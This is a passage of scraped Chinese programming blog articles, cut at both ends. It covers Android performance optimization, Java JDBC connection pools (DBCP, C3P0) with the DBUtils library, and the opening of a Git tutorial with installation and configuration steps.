信号时就无法正常进行正常渲染，这样就发生了丢帧现象。那么用户在 32ms 内看到的会是同一帧画面，这种现象在执行动画或滑动列表比较常见，还有可能是你的 Layout 太过复杂，层叠太多的绘制单元，无法在 16ms 完成渲染，最终引起刷新不及时。\n卡顿根本原因\n根据Android 系统显示原理可以看到，影响绘制的根本原因有以下两个方面：\n\n绘制任务太重，绘制一帧内容耗时太长。\n主线程太忙，根据系统传递过来的 VSYNC 信号来时还没准备好数据导致丢帧。\n\n绘制耗时太长，有一些工具可以帮助我们定位问题。主线程太忙则需要注意了，主线程关键职责是处理用户交互，在屏幕上绘制像素，并进行加载显示相关的数据，所以特别需要避免任何主线程的事情，这样应用程序才能保持对用户操作的即时响应。总结起来，主线程主要做以下几个方面工作：\n\nUI 生命周期控制\n系统事件处理\n消息处理\n界面布局\n界面绘制\n界面刷新\n\n除此之外，应该尽量避免将其他处理放在主线程中，特别复杂的数据计算和网络请求等。\n性能分析工具\n性能问题并不容易复现，也不好定位，但是真的碰到问题还是需要去解决的，那么分析问题和确认问题是否解决，就需要借助相应的的调试工具，比如查看 Layout 层次的 Hierarchy View、Android 系统上带的 GPU Profile 工具和静态代码检查工具 Lint 等，这些工具对性能优化起到非常重要的作用，所以要熟悉，知道在什么场景用什么工具来分析。\n1，Profile GPU Rendering\n在手机开发者模式下，有一个卡顿检测工具叫做：Profile GPU Rendering，如图：\n\n它的功能特点如下：\n\n一个图形监测工具，能实时反应当前绘制的耗时\n横轴表示时间，纵轴表示每一帧的耗时\n随着时间推移，从左到右的刷新呈现\n提供一个标准的耗时，如果高于标准耗时，就表示当前这一帧丢失\n\n2，TraceView\nTraceView 是 Android SDK 自带的工具，用来分析函数调用过程，可以对 Android 的应用程序以及 Framework 层的代码进行性能分析。它是一个图形化的工具，最终会产生一个图表，用于对性能分析进行说明，可以分析到每一个方法的执行时间，其中可以统计出该方法调用次数和递归次数，实际时长等参数维度，使用非常直观，分析性能非常方便。\n3，Systrace UI 性能分析\nSystrace 是 Android 4.1及以上版本提供的性能数据采样和分析工具，它是通过系统的角度来返回一些信息。它可以帮助开发者收集 Android 关键子系统，如 surfaceflinger、WindowManagerService 等 Framework 部分关键模块、服务、View系统等运行信息，从而帮助开发者更直观地分析系统瓶颈，改进性能。Systrace 的功能包括跟踪系统的 I/O 操作、内核工作队列、CPU 负载等，在 UI 显示性能分析上提供很好的数据，特别是在动画播放不流畅、渲染卡等问题上。\n优化建议\n1，布局优化\n布局是否合理主要影响的是页面测量时间的多少，我们知道一个页面的显示测量和绘制过程都是通过递归来完成的，多叉树遍历的时间与树的高度h有关，其时间复杂度 O(h)，如果层级太深，每增加一层则会增加更多的页面显示时间，所以布局的合理性就显得很重要。\n那布局优化有哪些方法呢，主要通过减少层级、减少测量和绘制时间、提高复用性三个方面入手。总结如下：\n\n减少层级。合理使用 RelativeLayout 和 LinerLayout，合理使用Merge。\n提高显示速度。使用 ViewStub，它是一个看不见的、不占布局位置、占用资源非常小的视图对象。\n布局复用。可以通过 标签来提高复用。\n尽可能少用wrap_content。wrap_content 会增加布局 measure 时计算成本，在已知宽高为固定值时，不用wrap_content 。\n删除控件中无用的属性。\n\n2，避免过度绘制\n过度绘制是指在屏幕上的某个像素在同一帧的时间内被绘制了多次。在多层次重叠的 UI 结构中，如果不可见的 UI 也在做绘制的操作，就会导致某些像素区域被绘制了多次，从而浪费了多余的 CPU 以及 GPU 资源。\n如何避免过度绘制呢，如下：\n\n布局上的优化。移除 XML 中非必须的背景，移除 Window 默认的背景、按需显示占位背景图片\n自定义View优化。使用 canvas.clipRect()来帮助系统识别那些可见的区域，只有在这个区域内才会被绘制。\n\n3，启动优化\n通过对启动速度的监控，发现影响启动速度的问题所在，优化启动逻辑，提高应用的启动速度。启动主要完成三件事：UI 布局、绘制和数据准备。因此启动速度优化就是需要优化这三个过程：\n\nUI 布局。应用一般都有闪屏页，优化闪屏页的 UI 布局，可以通过 Profile GPU Rendering 检测丢帧情况。\n启动加载逻辑优化。可以采用分布加载、异步加载、延期加载策略来提高应用启动速度。\n数据准备。数据初始化分析，加载数据可以考虑用线程初始化等策略。\n\n4，合理的刷新机制\n在应用开发过程中，因为数据的变化，需要刷新页面来展示新的数据，但频繁刷新会增加资源开销，并且可能导致卡顿发生，因此，需要一个合理的刷新机制来提高整体的 UI 流畅度。合理的刷新需要注意以下几点：\n\n尽量减少刷新次数。\n尽量避免后台有高的 CPU 线程运行。\n缩小刷新区域。\n\n5，其他\n在实现动画效果时，需要根据不同场景选择合适的动画框架来实现。有些情况下，可以用硬件加速方式来提供流畅度。\n内存优化\n在 Android 系统中有个垃圾内存回收机制，在虚拟机层自动分配和释放内存，因此不需要在代码中分配和释放某一块内存，从应用层面上不容易出现内存泄漏和内存溢出等问题，但是需要内存管理。Android 系统在内存管理上有一个 Generational Heap Memory 模型，内存回收的大部分压力不需要应用层关心， Generational Heap Memory 有自己一套管理机制，当内存达到一个阈值时，系统会根据不同的规则自动释放系统认为可以释放的内存，也正是因为 Android 程序把内存控制的权力交给了 Generational Heap Memory，一旦出现内存泄漏和溢出方面的问题，排查错误将会成为一项异常艰难的工作。除此之外，部分 Android 应用开发人员在开发过程中并没有特别关注内存的合理使用，也没有在内存方面做太多的优化，当应用程序同时运行越来越多的任务，加上越来越复杂的业务需求时，完全依赖 Android 的内存管理机制就会导致一系列性能问题逐渐呈现，对应用的稳定性和性能带来不可忽视的影响，因此，解决内存问题和合理优化内存是非常有必要的。\nAndroid内存管理机制\nAndroid 应用都是在 Android 的虚拟机上运行，应用 程序的内存分配与垃圾回收都是由虚拟机完成的。在 Android 系统，虚拟机有两种运行模式：Dalvik 和 ART。\n1，Java对象生命周期\n\n一般Java对象在虚拟机上有7个运行阶段：\n创建阶段->应用阶段->不可见阶段->不可达阶段->收集阶段->终结阶段->对象空间重新分配阶段\n2，内存分配\n在 Android 系统中，内存分配实际上是对堆的分配和释放。当一个 Android 程序启动，应用进程都是从一个叫做 Zygote 的进程衍生出来，系统启动 Zygote 进程后，为了启动一个新的应用程序进程，系统会衍生 Zygote 进程生成一个新的进程，然后在新的进程中加载并运行应用程序的代码。其中，大多数的 RAM pages 被用来分配给Framework 代码，同时促使 RAM 资源能够在应用所有进程之间共享。\n但是为了整个系统的内存控制需要，Android 系统会为每一个应用程序都设置一个硬性的 Dalvik Heap Size 最大限制阈值，整个阈值在不同设备上会因为 RAM 大小不同而有所差异。如果应用占用内存空间已经接近整个阈值时，再尝试分配内存的话，就很容易引起内存溢出的错误。\n3，内存回收机制\n我们需要知道的是，在 Java 中内存被分为三个区域：Young Generation(年轻代)、Old Generation(年老代)、Permanent Generation(持久代)。最近分配的对象会存放在 Young Generation 区域。对象在某个时机触发 GC 回收垃圾，而没有回收的就根据不同规则，有可能被移动到 Old Generation，最后累积一定时间在移动到 Permanent Generation 区域。系统会根据内存中不同的内存数据类型分别执行不同的 GC 操作。GC 通过确定对象是否被活动对象引用来确定是否收集对象，进而动态回收无任何引用的对象占据的内存空间。但需要注意的是频繁的 GC 会增加应用的卡顿情况，影响应用的流畅性，因此需要尽量减少系统 GC 行为，以便提高应用的流畅度，减小卡顿发生的概率。\n内存分析工具\n做内存优化前，需要了解当前应用的内存使用现状，通过现状去分析哪些数据类型有问题，各种类型的分布情况如何，以及在发现问题后如何发现是哪些具体对象导致的，这就需要相关工具来帮助我们。\n1，Memory Monitor\nMemory Monitor 是一款使用非常简单的图形化工具，可以很好地监控系统或应用的内存使用情况，主要有以下功能：\n\n显示可用和已用内存，并且以时间为维度实时反应内存分配和回收情况。\n快速判断应用程序的运行缓慢是否由于过度的内存回收导致。\n快速判断应用是否由于内存不足导致程序崩溃。\n\n2，Heap Viewer\nHeap Viewer 的主要功能是查看不同数据类型在内存中的使用情况，可以看到当前进程中的 Heap Size 的情况，分别有哪些类型的数据，以及各种类型数据占比情况。通过分析这些数据来找到大的内存对象，再进一步分析这些大对象，进而通过优化减少内存开销，也可以通过数据的变化发现内存泄漏。\n3，Allocation Tracker\nMemory Monitor 和 Heap Viewer 都可以很直观且实时地监控内存使用情况，还能发现内存问题，但发现内存问题后不能再进一步找到原因，或者发现一块异常内存，但不能区别是否正常，同时在发现问题后，也不能定位到具体的类和方法。这时就需要使用另一个内存分析工具 Allocation Tracker，进行更详细的分析， Allocation Tracker 可以分配跟踪记录应用程序的内存分配，并列出了它们的调用堆栈，可以查看所有对象内存分配的周期。\n4，Memory Analyzer Tool(MAT)\nMAT 是一个快速，功能丰富的 Java Heap 分析工具，通过分析 Java 进程的内存快照 HPROF 分析，从众多的对象中分析，快速计算出在内存中对象占用的大小，查看哪些对象不能被垃圾收集器回收，并可以通过视图直观地查看可能造成这种结果的对象。\n常见内存泄漏场景\n如果在内存泄漏发生后再去找原因并修复会增加开发的成本，最好在编写代码时就能够很好地考虑内存问题，写出更高质量的代码，这里列出一些常见的内存泄漏场景，在以后的开发过程中需要避免这类问题。\n\n资源性对象未关闭。比如Cursor、File文件等，往往都用了一些缓冲，在不使用时，应该及时关闭它们。\n注册对象未注销。比如事件注册后未注销，会导致观察者列表中维持着对象的引用。\n类的静态变量持有大数据对象。\n非静态内部类的静态实例。\nHandler临时性内存泄漏。如果Handler是非静态的，容易导致 Activity 或 Service 不会被回收。\n容器中的对象没清理造成的内存泄漏。\nWebView。WebView 存在着内存泄漏的问题，在应用中只要使用一次 WebView，内存就不会被释放掉。\n\n除此之外，内存泄漏可监控，常见的就是用LeakCanary 第三方库，这是一个检测内存泄漏的开源库，使用非常简单，可以在发生内存泄漏时告警，并且生成 leak tarce 分析泄漏位置，同时可以提供 Dump 文件进行分析。\n优化内存空间\n没有内存泄漏，并不意味着内存就不需要优化，在移动设备上，由于物理设备的存储空间有限，Android 系统对每个应用进程也都分配了有限的堆内存，因此使用最小内存对象或者资源可以减小内存开销，同时让GC 能更高效地回收不再需要使用的对象，让应用堆内存保持充足的可用内存，使应用更稳定高效地运行。常见做法如下：\n\n对象引用。强引用、软引用、弱引用、虚引用四种引用类型，根据业务需求合理使用不同，选择不同的引用类型。\n减少不必要的内存开销。注意自动装箱，增加内存复用，比如有效利用系统自带的资源、视图复用、对象池、Bitmap对象的复用。\n使用最优的数据类型。比如针对数据类容器结构，可以使用ArrayMap数据结构，避免使用枚举类型，使用缓存Lrucache等等。\n图片内存优化。可以设置位图规格，根据采样因子做压缩，用一些图片缓存方式对图片进行管理等等。\n\n稳定性优化\nAndroid 应用的稳定性定义很宽泛，影响稳定性的原因很多，比如内存使用不合理、代码异常场景考虑不周全、代码逻辑不合理等，都会对应用的稳定性造成影响。其中最常见的两个场景是：Crash 和 ANR，这两个错误将会使得程序无法使用，比较常用的解决方式如下：\n\n提高代码质量。比如开发期间的代码审核，看些代码设计逻辑，业务合理性等。\n代码静态扫描工具。常见工具有Android Lint、Findbugs、Checkstyle、PMD等等。\nCrash监控。把一些崩溃的信息，异常信息及时地记录下来，以便后续分析解决。\nCrash上传机制。在Crash后，尽量先保存日志到本地，然后等下一次网络正常时再上传日志信息。\n\n耗电优化\n在移动设备中，电池的重要性不言而喻，没有电什么都干不成。对于操作系统和设备开发商来说，耗电优化一致没有停止，去追求更长的待机时间，而对于一款应用来说，并不是可以忽略电量使用问题，特别是那些被归为“电池杀手”的应用，最终的结果是被卸载。因此，应用开发者在实现需求的同时，需要尽量减少电量的消耗。\n在 Android5.0 以前，在应用中测试电量消耗比较麻烦，也不准确，5.0 之后专门引入了一个获取设备上电量消耗信息的 API:Battery Historian。Battery Historian 是一款由 Google 提供的 Android 系统电量分析工具，和Systrace 一样，是一款图形化数据分析工具，直观地展示出手机的电量消耗过程，通过输入电量分析文件，显示消耗情况，最后提供一些可供参考电量优化的方法。\n除此之外，还有一些常用方案可提供：\n\n计算优化，避开浮点运算等。\n避免 WaleLock 使用不当。\n使用 Job Scheduler。\n\n安装包大小优化\n应用安装包大小对应用使用没有影响，但应用的安装包越大，用户下载的门槛越高，特别是在移动网络情况下，用户在下载应用时，对安装包大小的要求更高，因此，减小安装包大小可以让更多用户愿意下载和体验产品。\n常用应用安装包的构成，如图所示：\n\n从图中我们可以看到：\n\nassets文件夹。存放一些配置文件、资源文件，assets不会自动生成对应的 ID，而是通过 AssetManager 类的接口获取。\nres。res 是 resource 的缩写，这个目录存放资源文件，会自动生成对应的 ID 并映射到 .R 文件中，访问直接使用资源 ID。\nMETA-INF。保存应用的签名信息，签名信息可以验证 APK 文件的完整性。\nAndroidManifest.xml。这个文件用来描述 Android 应用的配置信息，一些组件的注册信息、可使用权限等。\nclasses.dex。Dalvik 字节码程序，让 Dalvik 虚拟机可执行，一般情况下，Android 应用在打包时通过 Android SDK 中的 dx 工具将 Java 字节码转换为 Dalvik 字节码。\nresources.arsc。记录着资源文件和资源 ID 之间的映射关系，用来根据资源 ID 寻找资源。\n\n减少安装包大小的常用方案\n\n代码混淆。使用proGuard 代码混淆器工具，它包括压缩、优化、混淆等功能。\n资源优化。比如使用 Android Lint 删除冗余资源，资源文件最少化等。\n图片优化。比如利用 AAPT 工具对 PNG 格式的图片做压缩处理，降低图片色彩位数等。\n避免重复功能的库，使用 WebP图片格式等。\n插件化。比如功能模块放在服务器上，按需下载，可以减少安装包大小。\n\n小结\n性能优化不是更新一两个版本就可以解决的，是持续性的需求，持续集成迭代反馈。在实际的项目中，在项目刚开始的时候，由于人力和项目完成时间限制，性能优化的优先级比较低，等进入项目投入使用阶段，就需要把优先级提高，但在项目初期，在设计架构方案时，性能优化的点也需要提早考虑进去，这就体现出一个程序员的技术功底了。\n什么时候开始有性能优化的需求，往往都是从发现问题开始，然后分析问题原因及背景，进而寻找最优解决方案，最终解决问题，这也是日常工作中常会用到的处理方式。\n"},{"title":"JAVA基础-JDBC二（常用的开源工具）","body":"\n一、连接池\n　　在实际的开发应用中，我们常常会对数据库进行大量的高并发的访问，而最原始的连接和操作方式并不能满足这种大量的访问，程序员为了追求更方便、更快捷、更科学安全的开发。第三方的工具类和Dao层的框架就应运而生了。DBCP连接池、和C3P0连接池就是2个常见的开源数据库连接池。\t　　在与数据库进行交互的过程中，获得连接”和“释放资源”是非常消耗系统资源的两个过程，为了解决此类性能问题，通常情况我们采用连接池技术，来共享连接Connection。这样我们就不需要每次都创建连接、释放连接了，这些操作都交给了连接池。用的时候从连接池里拿出来，用完了在给他放回去，下次使用时还可以接着用。\t　　同数据库的链接规范（JDBC）一样,java为数据库连接池也提供了一套规范（接口）- javax.sql.DataSource，各个厂商需要让自己的连接池实现这个接口。这样就方便了应用程序的扩展和我们的使用。\n（一）DBCP连接池\t\n　　DBCP连接池他是一个开源的连接池，属于Apache家族的一员，为Tomcat的内置连接池（自己的土，自己的地...）1、导入炸包\t　　使用第三方工具类的第一件事就是导入jar包，然后Build Patch一下，为了方便jar包的管理（另一方面满足于强迫症患者的整理欲望）一般都在工程下新建一个lib文件夹用来存放炸包。\t　　需要导入的jar包：\t　　* commons-dbcp-1.4.jar\t　　* commons-pool-1.5.6.jar\n2、DBCP连接池的使用\n 　　连接数据库的操作是一个频繁使用，代码重复的操作，可以将其抽取成一个工具类。\t　　Java为数据库连接池也提供了一套规范接口：DataSource，它是java中提供的连接池，作为 DriverManager 工具的替代项。而DBCP包则提供了DataSource接口的实现类 - BasicDataSource类。\n  栗子：\n\npublic class JdbcUtils {\n//定义一个连接池\nprivate static BasicDataSource bd = new BasicDataSource();\n//工具类，私有他的无参构造\nprivate JdbcUtils() {\nsuper();\n}\n//使用静态代码块进行连接池的属性配置 \n//静态代码块是随着类的加载而加载的且只加载一次（节省资源）\nstatic {\n/*\n* 必须设置的项\n*/\n//设置mySQL的驱动\nbd.setDriverClassName(\"com.mysql.jdbc.Driver\");\n//设置要连接数据库的URL\nbd.setUrl(\"jdbc:mysql://localhost:3306/mydb\");\n//设置用户名\nbd.setUsername(\"root\");\n//设置数据库密码\nbd.setPassword(\"root\");\n/*\n* 选择设置的项，不设置的话会有默认值跟着\n*/\n//初始化连接数\nbd.setInitialSize(10);\n//最大连接数\nbd.setMaxActive(15);\n//最大空闲连接数\nbd.setMaxIdle(6);\n//最小空闲连接数\nbd.setMinIdle(3);\n}\n/**\n* 获取连接池对象\n* @return bd 连接池\n*/\npublic static DataSource getDataSource() {\nreturn bd;\n}\n}\n\n（二）C3P0连接池\n 　　C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。（百度百科）\t　　C3P0连接池有自动回收空闲连接的功能，而DBCP没有自动回收空闲连接的功能。1、导入jar包\t　　同DBCP的使用步骤一样，第一步要导入相关的jar包：\t　　c3p0-0.9.1.2.jar2、C3P0连接池的使用\t　　通过查看帮助文档（doc目录下的index.html文件里边有个快速入门）发现C3P0可以通过手动或者配置文件的方式使用。\n 　　 * 通过手动进行配置\n\npublic static void main(String[] args) throws Exception {\n// 获得C3P0连接池对象\nComboPooledDataSource source = new ComboPooledDataSource();\n// 设置驱动\nsource.setDriverClass(\"com.mysql.jdbc.Driver\");\n// 设置连接库的路径\nsource.setJdbcUrl(\"jdbc:mysql:///mydb\");\n// 设置用户名\nsource.setUser(\"root\");\n// 设置密码\nsource.setPassword(\"root\");\n// 通过连接池创建一个QueryRunner对象\nQueryRunner runner = new QueryRunner(source);\n// 测试\nString sql = \"SELECT * FROM users\";\nList<Object[]> list = runner.query(sql, new ArrayListHandler());\nfor (Object[] objects : list) {\nfor (Object object : objects) {\nSystem.out.print(object + \" \");\n}\nSystem.out.println();\n}\n}\n\n 　　\n　　* 通过配置文件进行配置\t　　C3P0连接池支持.xml和属性文件.properties的文件配置，当然了他对其配置文件的名字和里边的文件也有一定的要求（搞一个别的名他就不认识了），XML配置文件的名字一定是c3p0-config.xml，属性配置文件的名字一定是c3p0.properties.默认情况下C3P0连接池就会找类加载路径下的c3p0-config.xml进行解析。c3p0-config.xml配置文件除了一些链接数据库的一些必要属性外也可以配置一些连接池其他的属性：最小池里的数量，最大池里的数量等。具体的属性配置可以百度或者阅读开发文档。\n　　栗子：  * c3p0-config.xml配置文件\n\n<c3p0-config>\n<default-config>\n<property name=\"driverClass\">com.mysql.jdbc.Driver</property>\n<property name=\"jdbcUrl\">jdbc:mysql:///mydb</property>\n<property name=\"user\">root</property>\n<property name=\"password\">root</property>\n</default-config>\n</c3p0-config>\n\n  * C3P0的工具类\n\npublic class C3p0Utils {\n// 定义一个c3p0连接池\nprivate static ComboPooledDataSource source;\n// 定义一个连接对象\nprivate static Connection connection;\n\nprivate C3p0Utils() {\nsuper();\n}\n\nstatic {\n// 初始化连接池\nsource = new ComboPooledDataSource();\ntry {\n// 获得一个连接\nconnection = source.getConnection();\n} catch (Exception e) {\n// TODO Auto-generated catch block\ne.printStackTrace();\n}\n}\n\npublic static Connection getConnection() {\nreturn connection;\n}\n}\n\n 　　通过代码演示可以看到通过配置文件的方式还是非常方便的，后期维护的话只要改相关的配置文件就可以了，xml作为配置文件便于我们的阅读，所以推荐使用c3p0-config.xml配置文件。\n二、DBUtils工具类\t\n　　使用原生的JDBC进行开发，你会发现代码冗余过多，使用麻烦，极度不爽。而工具类的出现就是为了简化我们的开发。DBUtils是apache commons组件一个成员，使用DBUtils工具类首先要导入相关的jar包 - commons-dbutils-1.6.jar。\t　　DBUtils封装并简化了JDBC操作，减少了相关代码的书写、它一共有3个核心的部分组成：\t　　* QueryRunner提供对sql语句操作的API。\t　　* ResultSetHandler接口提供了执行完sql语句后怎样封装结果集。\t　　* DbUtils工具类提供了关闭相关资源和处理事物的方法。1、QueryRunner核心类\t　　* new QueryRunner() ，无参构造，使用无参构造时，调用update，query方法时需要传入Connection对象\t　　* update(Connection conn, String sql, Object... params) ，用来完成表数据的增加、删除、更新操作。\t　　* query(Connection conn, String sql, ResultSetHandler<T> rsh, Object... params) ，用来完成表数据的查询操作。------------------------------------------------------------------------------------------------------------------------------------------------------------------\t　　* new QueryRunner(DataSource ds) ，带参构造，使用带参构造时调用update，query方法无需要传入Connection对象\t　　* update(String sql, Object... params) ，用来完成表数据的增加、删除、更新操作。\t　　* query(String sql, ResultSetHandler<T> rsh, Object... params) ，用来完成表数据的查询操作。\n\t　　栗子：  * 无参构造的update方法\n\n/**\n* 增加操作\n* @throws SQLException\n*/\nprivate static void method01() throws SQLException {\n// 通过工具类获得连接\nConnection connection = JdbcUtilsConfig.getConnection();\n// 获得QueryRunner对象\nQueryRunner runner = new QueryRunner();\n// 编写sql语句\nString insert = \"INSERT INTO sort(sname,sprice,sdesc) VALUES(?,?,?)\";\n// 执行update方法，也可以将数据存到Object数组里然后传入数组，返回值为影响的行数\nint update = runner.update(connection, insert, \"家具\", 1000, \"很好用\");\nSystem.out.println(update);\n}\n\n/**\n* 更新操作\n* \n* @throws SQLException\n*/\nprivate static void method02() throws SQLException {\n// 通过工具类获得连接\nConnection connection = JdbcUtilsConfig.getConnection();\n// 获得QueryRunner对象\nQueryRunner runner = new QueryRunner();\n// 编写sql语句\nString s = \"UPDATE sort SET sname=?,sprice=?,sdesc=? WHERE sid=4\";\n// 执行update方法\nrunner.update(connection, s, \"花卉\", 100, \"买给你爱的人\");\n//安静的关闭\nDbUtils.closeQuietly(connection);\n}\n\n/**\n* 删除操作\n* \n* @throws SQLException\n*/\nprivate static void method03() throws SQLException {\n// 通过工具类获得连接\nConnection connection = JdbcUtilsConfig.getConnection();\n// 创建一个QueryRunner对象，用来完成SQL语句的执行\nQueryRunner qr = new QueryRunner();\n// 执行SQL语句\nString sql = \"DELETE FROM zhangwu WHERE name = ?\";\nObject[] params = { \"股票收入\" };\nint line = qr.update(connection, sql, params);\n// 结果集的处理，影响的行数\nSystem.out.println(\"line=\" + line);\n}\n\n \n　　* 有参构造的query方法\n\npublic static void main(String[] args) throws Exception {\n// 通过工具类获得连接池对象\nDataSource dataSource = C3p0Utils.getDataSource();\n// 通过连接池创建一个QueryRunner对象\nQueryRunner runner = new QueryRunner(dataSource);\n// 编写sql语句\nString sql = \"SELECT * FROM users\";\n// 执行query方法传入ArrayListHandler返回集合\nList<Object[]> list = runner.query(sql, new ArrayListHandler());\n// 遍历集合\nfor (Object[] objects : list) {\nfor (Object object : objects) {\nSystem.out.print(object + \" \");\n}\nSystem.out.println();\n}\n}\n\n \n2、ResultSetHandler结果集处理类\t　　* ArrayHandler  将结果集中的第一条记录封装到一个Object[]数组中，数组中的每一个元素就是这条记录的值。\t　　* ArrayListHandler  将结果集中的每一条记录都封装到一个Object[]数组中，将这些数组在封装到List集合中。\t　　* BeanHandler  将结果集中第一条记录封装到一个指定的javaBean中。\t　　* BeanListHandler  将结果集中每一条记录封装到指定的javaBean中，将这些javaBean在封装到List集合中。\t　　* ColumnListHandler  将结果集中指定的列的字段值，封装到一个List集合中。\t　　* ScalarHandler  它是用于单数据。例如sql中的聚合函数SUM(),Count()等。\t　　* MapHandler  将结果集第一行封装到Map集合中,Key 列名, Value 该列数据，可以配合工具类BeanUtils.populate(Bean bean, Map map);一起使用方便数据的封装。\t　　* MapListHandler  将结果集第一行封装到Map集合中,Key 列名, Value 该列数据,Map集合存储到List集合。\t\t　　常用Handler举例:  *BeanHandler的栗子：\n\n/**\n     * 商品详情查询\n     * \n     * @param pid\n     * @return product\n     * @throws Exception\n     */\n    @Override\n    public Product findByPid(String pid) throws Exception {\n        //通过连接池创建QueryRunner对象\n        QueryRunner queryRunner = new QueryRunner(C3p0Utils.getDataSourse());\n        //根据传入的商品ID编写sql语句\n        String sql = \"SELECT * FROM product WHERE pid=?\";\n        //传入sql语句和BeanHandler结果集返回商品Bean\n        Product product = queryRunner.query(sql, new BeanHandler<Product>(Product.class), pid);\n        return product;\n    }\n\n  * ScalarHandler的栗子：\n\n    /**\n     * 商品总数查询\n     * @return totalCount\n     * @throws Exception\n     */\n    @Override\n    public Integer findAdmintotalCount() throws Exception {\n        QueryRunner queryRunner = new QueryRunner(C3p0Utils.getDataSourse());\n        //pflag字段为是否下架\n        String sql = \"SELECT COUNT(*) FROM product WHERE pflag=?\";\n        Long totalCount = (Long) queryRunner.query(sql, new ScalarHandler(),Product.UN_FLAG);\n        //将Long转换成Integer类型返回\n        return totalCount.intValue();\n    }\n\n  * BeanListHandler的栗子：\n\n/**\n     * 根据类别查询商品\n     * \n     * @param cid 商品ID\n     * @param beginPage 起始页\n     * @param pageSize 每页显示的条数\n     * @return list\n     * @throws Exception\n     */\n    @Override\n    public List<Product> findPageByCid(String cid, Integer beginPage, Integer pageSize) throws Exception {\n        QueryRunner queryRunner = new QueryRunner(C3p0Utils.getDataSourse());\n        //分页查询\n        String sql = \"SELECT * FROM product WHERE cid=? AND pflag=? LIMIT ?,?\";\n        //BeanListHandler里泛型要写你查询实体Bean类型，传入参数为Bean.class\n        List<Product> list = queryRunner.query(sql, new BeanListHandler<Product>(Product.class), cid, Product.UN_FLAG,\n                beginPage, pageSize);\n        //返回结合\n        return list;\n    }\n\n \n3、DbUtils工具类\t　　此类提供了关闭相关资源和处理事物的方法：\t　　* DbUtils.closeQuietly()  安静的关闭资源。"},{"title":"分布式版本控制系统 Git 教程","body":"简介\nGit 是什么？\nGit 是一个开源的分布式版本控制系统。\n什么是版本控制？\n版本控制是一种记录一个或若干文件内容变化，以便将来查阅特定版本修订情况的系统。\n什么是分布式版本控制系统？\n介绍分布式版本控制系统前，有必要先了解一下传统的集中式版本控制系统。\n集中化的版本控制系统，诸如 CVS，Subversion 等，都有一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。\n这么做最显而易见的缺点是中央服务器的单点故障。如果宕机一小时，那么在这一小时内，谁都无法提交更新，也就无法协同工作。要是中央服务器的磁盘发生故障，碰巧没做备份，或者备份不够及时，就会有丢失数据的风险。最坏的情况是彻底丢失整个项目的所有历史更改记录。\n\n分布式版本控制系统的客户端并不只提取最新版本的文件快照，而是把代码仓库完整地镜像下来。这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复。因为每一次的提取操作，实际上都是一次对代码仓库的完整备份。\n\n为什么使用 Git？\nGit 是分布式的。这是 Git 和其它非分布式的版本控制系统，例如 svn，cvs 等，最核心的区别。分布式带来以下好处：\n工作时不需要联网\n首先，分布式版本控制系统根本没有“中央服务器”，每个人的电脑上都是一个完整的版本库，这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。既然每个人电脑上都有一个完整的版本库，那多个人如何协作呢？比方说你在自己电脑上改了文件A，你的同事也在他的电脑上改了文件A，这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。\n更加安全\n集中式版本控制系统，一旦中央服务器出了问题，所有人都无法工作。\n分布式版本控制系统，每个人电脑中都有完整的版本库，所以某人的机器挂了，并不影响其它人。\n原理\n版本库\n当你一个项目到本地或创建一个 git 项目，项目目录下会有一个隐藏的 .git 子目录。这个目录是 git 用来跟踪管理版本库的，千万不要手动修改。\n哈希值\nGit 中所有数据在存储前都计算校验和，然后以校验和来引用。 这意味着不可能在 Git 不知情时更改任何文件内容或目录内容。 这个功能建构在 Git 底层，是构成 Git 哲学不可或缺的部分。 若你在传送过程中丢失信息或损坏文件，Git 就能发现。\nGit 用以计算校验和的机制叫做 SHA-1 散列（hash，哈希）。 这是一个由 40 个十六进制字符（0-9 和 a-f）组成字符串，基于 Git 中文件的内容或目录结构计算出来。 SHA-1 哈希看起来是这样：\n24b9da6552252987aa493b52f8696cd6d3b00373\nGit 中使用这种哈希值的情况很多，你将经常看到这种哈希值。 实际上，Git 数据库中保存的信息都是以文件内容的哈希值来索引，而不是文件名。\n文件状态\n在 GIt 中，你的文件可能会处于三种状态之一：\n\n已修改（modified）\n\n已修改表示修改了文件，但还没保存到数据库中。\n\n已暂存（staged）\n\n已暂存表示对一个已修改文件的当前版本做了标记，使之包含在下次提交的快照中。\n\n已提交（committed）\n\n已提交表示数据已经安全的保存在本地数据库中。 \n工作区域\n与文件状态对应的，不同状态的文件在 Git 中处于不同的工作区域。\n\n工作区（working）\n\n当你 git clone 一个项目到本地，相当于在本地克隆了项目的一个副本。\n工作区是对项目的某个版本独立提取出来的内容。 这些从 Git 仓库的压缩数据库中提取出来的文件，放在磁盘上供你使用或修改。\n\n暂存区（staging）\n\n暂存区是一个文件，保存了下次将提交的文件列表信息，一般在 Git 仓库目录中。 有时候也被称作`‘索引’'，不过一般说法还是叫暂存区。\n\n本地仓库（local）\n\n提交更新，找到暂存区域的文件，将快照永久性存储到 Git 本地仓库。\n\n远程仓库（remote）\n\n以上几个工作区都是在本地。为了让别人可以看到你的修改，你需要将你的更新推送到远程仓库。\n同理，如果你想同步别人的修改，你需要从远程仓库拉取更新。\n\n安装\nLinux\nDebian/Ubuntu\n如果你使用的系统是 Debian/Ubuntu ， 安装命令为：\n$ apt-get install libcurl4-gnutls-dev libexpat1-dev gettext \\\n> libz-dev libssl-dev\n$ apt-get install git-core\n$ git --version\ngit version 1.8.1.2\nCentos/RedHat\n如果你使用的系统是 Centos/RedHat ，安装命令为：\n$ yum install curl-devel expat-devel gettext-devel \\\n> openssl-devel zlib-devel\n$ yum -y install git-core\n$ git --version\ngit version 1.7.1\nWindows\n在Git 官方下载地址下载 exe 安装包。按照安装向导安装即可。\n建议安装 Git Bash 这个 git 的命令行工具。\nMac\n在Git 官方下载地址下载 mac 安装包。按照安装向导安装即可。\n配置\nGit 自带一个 git config 的工具来帮助设置控制 Git 外观和行为的配置变量。 这些变量存储在三个不同的位置：\n\n/etc/gitconfig 文件: 包含系统上每一个用户及他们仓库的通用配置。 如果使用带有 --system 选项的 git config 时，它会从此文件读写配置变量。\n~/.gitconfig 或 ~/.config/git/config 文件：只针对当前用户。 可以传递 --global 选项让 Git 读写此文件。\n当前使用仓库的 Git 